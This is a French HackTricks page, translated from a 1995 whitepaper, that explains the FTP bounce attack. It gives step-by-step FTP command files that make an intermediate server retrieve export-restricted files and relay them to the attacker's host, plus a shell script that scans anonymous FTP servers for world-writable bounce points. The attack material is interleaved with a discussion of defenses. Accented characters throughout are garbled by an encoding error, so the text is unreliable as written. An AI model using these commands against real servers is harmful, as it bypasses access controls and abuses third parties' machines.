<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# R√©sum√©

Si vous avez acc√®s √† un serveur FTP interm√©diaire, vous pouvez le faire demander des fichiers d'un autre serveur FTP \(o√π vous connaissez des identifiants\) et t√©l√©charger ce fichier sur votre propre serveur.

## Pr√©requis

Des identifiants FTP valides sur le serveur FTP interm√©diaire
Des identifiants FTP valides sur le serveur FTP victime
Les deux serveurs acceptent la commande PORT \(attaque FTP bounce\)
Vous pouvez √©crire dans un r√©pertoire du serveur FTP interm√©diaire
Le serveur interm√©diaire aura plus d'acc√®s √† l'int√©rieur du serveur FTP victime que vous pour une raison quelconque \(c'est ce que vous allez exploiter\)

## √âtapes

1. Connectez-vous √† votre propre serveur FTP et rendez la connexion passive \(commande pasv\) pour qu'il √©coute dans un r√©pertoire o√π le service victime enverra le fichier
2. Cr√©ez le fichier qui va √™tre envoy√© du serveur FTP interm√©diaire au serveur victime \(l'exploit\). Ce fichier sera un texte brut des commandes n√©cessaires pour s'authentifier contre le serveur victime, changer de r√©pertoire et t√©l√©charger un fichier sur votre propre serveur.
3. Connectez-vous au serveur FTP interm√©diaire et t√©l√©chargez le fichier pr√©c√©dent
4. Faites √©tablir une connexion entre le serveur FTP interm√©diaire et le serveur victime et envoyez le fichier d'exploit
5. Capturez le fichier sur votre propre serveur FTP
6. Supprimez le fichier d'exploit du serveur FTP interm√©diaire



Toutes les informations de ce post ont √©t√© extraites de : [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# L'attaque FTP Bounce

Ceci discute d'une des nombreuses utilisations possibles de "l'attaque par rebond du serveur FTP". Le m√©canisme utilis√© est probablement bien connu, mais jusqu'√† pr√©sent, l'int√©r√™t pour le d√©tailler ou le corriger semble faible √† inexistant. Cet exemple particulier d√©montre une autre mani√®re dont la plupart des "restrictions d'exportation" appliqu√©es √©lectroniquement sont compl√®tement inutiles et faciles √† contourner. Il est choisi dans le but de faire prendre conscience au lecteur qu'il existe certains aspects vraiment mal con√ßus du protocole FTP standard.

Merci √©galement √† Alain Knaff chez imag.fr pour une discussion br√®ve mais divertissante sur certains de ces probl√®mes il y a quelques mois, qui m'a fait r√©fl√©chir plus profond√©ment √† leur sujet.

## Le motif

Vous √™tes un utilisateur sur foreign.fr, adresse IP F.F.F.F, et vous souhaitez r√©cup√©rer du code source cryptographique de crypto.com aux √âtats-Unis. Le serveur FTP de crypto.com est configur√© pour permettre votre connexion, mais refuser l'acc√®s aux sources cryptographiques parce que votre adresse IP source est celle d'un site non am√©ricain \[autant que leur serveur FTP peut le d√©terminer √† partir du DNS, c'est-√†-dire\]. Dans tous les cas, vous ne pouvez pas r√©cup√©rer directement ce que vous voulez du serveur de crypto.com.

Cependant, crypto.com permettra √† ufred.edu de t√©l√©charger les sources cryptographiques car ufred.edu est √©galement aux √âtats-Unis. Vous savez par hasard que /incoming sur ufred.edu est un r√©pertoire accessible en √©criture par tout le monde o√π tout utilisateur anonyme peut d√©poser des fichiers et les r√©cup√©rer. L'adresse IP de crypto.com est C.C.C.C.

## L'attaque

Cela suppose que vous avez un serveur FTP qui fait du mode passif. Ouvrez une connexion FTP √† la v√©ritable adresse IP de votre propre machine \[pas localhost\] et connectez-vous. Changez pour un r√©pertoire pratique o√π vous avez des droits d'√©criture, puis faites :
```text
pasv
stor foobar
```
Prenez note de l'adresse et du port renvoy√©s par la commande PASV, F,F,F,F,X,X. Cette session FTP va maintenant √™tre en attente, alors mettez-la en arri√®re-plan ou passez √† une autre fen√™tre pour continuer.

Construisez un fichier contenant des commandes de serveur FTP. Appelons ce fichier "`instrs`". Il ressemblera √† ceci :
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
```
Ouvrez une connexion FTP √† ufred.edu, connectez-vous de mani√®re anonyme et rendez-vous dans le r√©pertoire /incoming. Tapez ensuite ce qui suit dans cette session FTP, ce qui transf√®re une copie de votre fichier "`instrs`" puis indique au serveur FTP de ufred.edu de se connecter au serveur FTP de crypto.com en utilisant votre fichier comme les commandes :
```
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z` devrait maintenant appara√Ætre comme "`foobar`" sur votre machine via votre premi√®re connexion FTP. Si la connexion √† ufred.edu ne s'est pas interrompue d'elle-m√™me en raison d'un bug de serveur apparemment courant, nettoyez en supprimant "`instrs`" et en sortant. Sinon, vous devrez vous reconnecter pour terminer.

##  Discussion

Il existe plusieurs variantes de ceci. Votre connexion d'√©coute PASV peut √™tre ouverte sur n'importe quelle machine o√π vous avez un acc√®s en √©criture aux fichiers -- la v√¥tre, une autre connexion √† ufred.edu, ou un endroit compl√®tement diff√©rent. En fait, il n'est m√™me pas n√©cessaire que ce soit un serveur FTP -- n'importe quel utilitaire qui √©coutera sur un port TCP connu et lira les donn√©es brutes dans un fichier fera l'affaire. Une connexion de donn√©es FTP en mode passif est simplement un moyen pratique de faire cela.

Les octets nuls suppl√©mentaires √† la fin du fichier de commande servent √† remplir les fen√™tres TCP aux deux extr√©mit√©s de la connexion ufred -&gt; crypto, et √† garantir que la connexion de commande reste ouverte assez longtemps pour que toute la session soit ex√©cut√©e. Sinon, la plupart des serveurs FTP ont tendance √† interrompre tous les transferts et le traitement des commandes lorsque la connexion de contr√¥le se ferme pr√©matur√©ment. La taille des donn√©es est suffisante pour remplir les fen√™tres de r√©ception et de transmission, qui sur certains syst√®mes d'exploitation sont assez grandes \[de l'ordre de 30K\]. Vous pouvez r√©duire cela si vous connaissez les syst√®mes d'exploitation aux deux extr√©mit√©s et la somme de leurs tailles de fen√™tre TCP par d√©faut. Il est divis√© en lignes de 250 caract√®res pour √©viter de d√©border les tampons de commande sur le serveur cible -- probablement acad√©mique puisque vous avez d√©j√† demand√© au serveur de quitter.

Si crypto.com interdit \*toute\* connexion de client FTP de votre part chez foreign.fr et que vous avez besoin de voir quels fichiers se trouvent o√π, vous pouvez toujours mettre "`list -aR`" dans votre fichier de commande et obtenir un listing de r√©pertoire de l'arbre entier via ufred.

Vous devrez peut-√™tre r√©cup√©rer votre fichier de commande sur le serveur FTP cible en mode ASCII plut√¥t qu'en mode binaire. Certains serveurs FTP peuvent g√©rer les nouvelles lignes brutes, mais d'autres peuvent n√©cessiter des lignes de commande termin√©es par des paires CRLF. Gardez cela √† l'esprit lorsque vous r√©cup√©rez des fichiers vers des d√©mons autres que des serveurs FTP.

##  Autres possibilit√©s

Malgr√© le fait que de telles connexions tierces ne sont que dans un sens, elles peuvent √™tre utilis√©es pour toutes sortes de choses. Des m√©thodes similaires peuvent √™tre utilis√©es pour poster du courrier et des nouvelles pratiquement intra√ßables, marteler sur des serveurs de diff√©rents sites, remplir des disques, essayer de franchir des pare-feu, et g√©n√©ralement √™tre ennuyeux et difficile √† localiser en m√™me temps. Un peu de r√©flexion vous fera r√©aliser de nombreuses autres possibilit√©s effrayantes.

Les connexions lanc√©es de cette mani√®re proviennent du port source 20, que certains sites autorisent √† travers leurs pare-feu dans le but de g√©rer le probl√®me "ftp-data". Pour certains usages, cela peut √™tre la chose la plus proche des attaques √† source rout√©e, et est susceptible de r√©ussir l√† o√π le routage de source √©choue contre les filtres de paquets. Et tout cela est rendu possible par la fa√ßon dont la sp√©cification du protocole FTP a √©t√© √©crite, permettant aux connexions de contr√¥le de provenir de n'importe o√π et aux connexions de donn√©es d'aller n'importe o√π.

##  D√©fenses

Il y aura toujours des sites sur le net avec de vieux serveurs FTP et des r√©pertoires accessibles en √©criture qui permettent ce type de trafic, donc dire "r√©parer tous les serveurs FTP" est la mauvaise r√©ponse. Mais vous pouvez prot√©ger le v√¥tre contre le fait d'√™tre un point de rebond tiers et d'en avoir un autre utilis√© contre vous.

La premi√®re chose √©vidente √† faire est de permettre √† un serveur FTP de ne faire des connexions de donn√©es qu'au m√™me h√¥te d'o√π provient la connexion de contr√¥le. Cela ne pr√©vient pas l'attaque ci-dessus, bien s√ªr, puisque l'√©couteur PASV pourrait tout aussi bien √™tre sur ufred.edu et ainsi r√©pondre √† cette exigence, mais cela emp√™che \*votre\* site d'√™tre un point de rebond potentiel. Cela casse √©galement le concept de "proxy FTP", mais cach√© quelque part dans ce paragraphe se trouve un tr√®s petit violon.

La chose suivante √©vidente est d'interdire les connexions de contr√¥le FTP qui proviennent de ports r√©serv√©s, ou au moins du port 20. Cela emp√™che le sc√©nario ci-dessus tel qu'√©nonc√©.

Ces deux choses, plus les habituelles recommandations de blocage des paquets √† source rout√©e et d'autres voies de spoofing, sont n√©cessaires pour pr√©venir des hacks de ce genre. Et r√©fl√©chissez √† savoir si vous avez vraiment besoin d'un r√©pertoire "incoming" ouvert.

Autoriser uniquement les connexions de donn√©es de client en mode passif est une autre possibilit√©, mais il y a encore trop de clients FTP en usage qui ne sont pas conscients du mode passif.

##  "Un consensus l√¢che et du code en fonctionnement"

Il existe des travaux existants abordant cela disponibles ici √† avian.org \[et cela depuis plusieurs mois, je pourrais ajouter\] dans les "[archives fixkits](ftp://ftp.avian.org:/src/fixkits/)". Plusieurs modifications de wu-ftpd-2.4 sont pr√©sent√©es, qui incluent du code pour pr√©venir et enregistrer les tentatives d'utilisation de commandes PORT fallacieuses. Des correctifs de s√©curit√© r√©cents provenant d'autres sources sont √©galement inclus, ainsi qu'un support s/key et diverses options de compilation pour renforcer la s√©curit√© pour des applications sp√©cifiques.

Stan Barber √† academ.com travaille sur la fusion de ces correctifs et de plusieurs autres dans une v√©ritable mise √† jour de wu-ftpd. Il y a un couple d'autres efforts divergents en cours. Nulle part il n'est affirm√© que l'un de ces travaux est complet, mais c'est un d√©but vers quelque chose que j'ai en t√™te depuis un moment -- une sortie √† l'√©chelle du r√©seau de wu-ftpd-2.5, avec des contributions de partout sur le net. Le serveur wu-ftpd est devenu tr√®s populaire, mais a tristement besoin d'une autre mise √† niveau de s√©curit√©. Il serait bien de rassembler toutes les am√©liorations en un seul endroit coordonn√©, et il semble que cela va se produire. Tout cela n'aidera toujours pas les personnes qui insistent pour ex√©cuter des serveurs fournis par les fournisseurs, bien s√ªr.

La v√©rification de la coh√©rence du port source de la connexion client n'est pas impl√©ment√©e sp√©cifiquement dans les correctifs du serveur FTP, mais dans des modifications apport√©es au paquet tcp-wrappers de Wietse puisque ce probl√®me est plus g√©n√©ral. Une simple option PORT est ajout√©e qui refuse les connexions provenant de plages configurables de ports source √† l'√©tape tcpd, avant qu'un d√©mon appel√© soit ex√©cut√©.

Certains de cela est indiqu√© par [/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README) dans la zone FTP anonyme ici. Lisez ce guide avant de prendre d'autres choses.

##  Notes

L'ajout des octets nuls √† la fin du fichier de commande √©tait la cl√© pour faire fonctionner cela contre une vari√©t√© de d√©mons. Envoyer simplement les donn√©es souhait√©es √©chouerait g√©n√©ralement en raison de la fermeture imm√©diate signalant au d√©mon d'abandonner.

Si WUSTL n'a pas compl√®tement abandonn√© le projet wu-ftpd, ils se taisent tr√®s fort sur les travaux ult√©rieurs. Bryan O'Connor semble avoir beaucoup d'autres projets √† suivre maintenant...

Ceci est un script trivial pour trouver des r√©pertoires et des fichiers accessibles en √©criture au monde et appartenant √† ftp sur un serveur FTP anonyme bas√© sur unix. Vous seriez surpris de voir combien de ces "points de rebond" accessibles en √©criture ressortent apr√®s une courte ex√©cution de quelque chose comme cela. Vous devrez v√©rifier plus tard que vous pouvez √† la fois mettre et obtenir des fichiers de tels endroits ; certains serveurs prot√®gent les fichiers t√©l√©charg√©s contre la lecture. Beaucoup ne le font pas, et se demandent ensuite pourquoi ils font partie des dix meilleurs sites de warez de la semaine...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
On pourrait qualifier cela de livre blanc. Il est disponible sur avian.org dans [/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack) ainsi que publi√© dans divers endroits pertinents. \_H\* 950712

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
